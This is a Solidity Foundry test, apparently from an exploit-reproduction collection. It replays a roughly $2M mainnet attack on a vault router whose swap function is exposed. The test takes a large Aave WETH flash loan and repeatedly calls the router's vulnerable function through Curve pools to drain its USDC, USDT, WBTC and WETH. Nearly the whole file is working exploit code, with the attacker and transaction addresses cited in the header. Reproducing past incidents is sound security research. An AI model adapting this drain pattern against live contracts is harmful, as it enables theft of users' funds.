// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$2M
// Attacker : https://etherscan.io/address/0x46d9b3dfbc163465ca9e306487cba60bc438f5a2
// Attack Contract : https://etherscan.io/address/0xeadf72fd4733665854c76926f4473389ff1b78b1
// Vuln Contract : https://etherscan.io/address/0x05f016765c6c601fd05a10dba1abe21a04f924a5
// Attack Tx : https://explorer.phalcon.xyz/tx/eth/0xbc08860cd0a08289c41033bdc84b2bb2b0c54a51ceae59620ed9904384287a38

// @Analysis
// https://twitter.com/BlockSecTeam/status/1722101942061601052
interface ISmartVaultManagerV2 {
    function mint() external;
    function swap(bytes32 _inToken, bytes32 _outToken, uint256 _amount) external;
}

interface ICurve {
    function exchange(uint256 i, uint256 j, uint256 dx, uint256 min_dy) external;
}

interface ISwapFlashLoan {
    function flashLoan(address receiver, address token, uint256 amount, bytes memory params) external;
}

contract ContractTest is Test {
    IAaveFlashloan aave = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    address router = 0x05f016765c6C601fd05a10dBa1AbE21a04F924A5;
    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 wbtc = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    ICurve firstCrvPool = ICurve(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
    ICurve secondCrvPool = ICurve(0xD51a44d3FaE010294C616388b506AcdA1bfAAE46);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 limitSqrtPrice;
    }

    function setUp() public {
        vm.createSelectFork("mainnet", 18_523_344 - 1);
        cheats.label(address(weth), "WETH");
        cheats.label(address(secondCrvPool), "Curve.fi: USDT/WBTC/WETH Pool");
    }

    function testExpolit() public {
        emit log_named_decimal_uint("attacker balance before attack", weth.balanceOf(address(this)), weth.decimals());

        aave.flashLoanSimple(address(this), address(weth), 27_255_000_000_000_000_000_000, new bytes(1), 0);
        emit log_named_decimal_uint("attacker balance after attack", weth.balanceOf(address(this)), weth.decimals());
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initator,
        bytes calldata params
    ) external payable returns (bool) {
        weth.approve(address(aave), type(uint256).max);
        bytes4 vulnFunctionSignature = hex"f6ebebbb";
        bytes memory data = abi.encodeWithSelector(
            vulnFunctionSignature,
            usdc.balanceOf(address(router)),
            0,
            address(usdc),
            address(usdt),
            address(firstCrvPool),
            0,
            0
        );
        (bool success, bytes memory result) = address(router).call(data);
        data = abi.encodeWithSelector(
            vulnFunctionSignature,
            usdt.balanceOf(address(router)),
            0,
            address(usdt),
            address(weth),
            address(secondCrvPool),
            0,
            0
        );
        (success, result) = address(router).call(data);
        data = abi.encodeWithSelector(
            vulnFunctionSignature,
            wbtc.balanceOf(address(router)),
            0,
            address(wbtc),
            address(weth),
            address(secondCrvPool),
            0,
            0
        );
        (success, result) = address(router).call(data);

        weth.approve(address(secondCrvPool), type(uint256).max);
        secondCrvPool.exchange(2, 1, weth.balanceOf(address(this)), 0);
        data = abi.encodeWithSelector(
            vulnFunctionSignature,
            weth.balanceOf(address(router)),
            0,
            address(weth),
            address(wbtc),
            address(secondCrvPool),
            0,
            0
        );
        (success, result) = address(router).call(data);
        wbtc.approve(address(secondCrvPool), type(uint256).max);
        secondCrvPool.exchange(1, 2, wbtc.balanceOf(address(this)), 0);
        return true;
    }
}
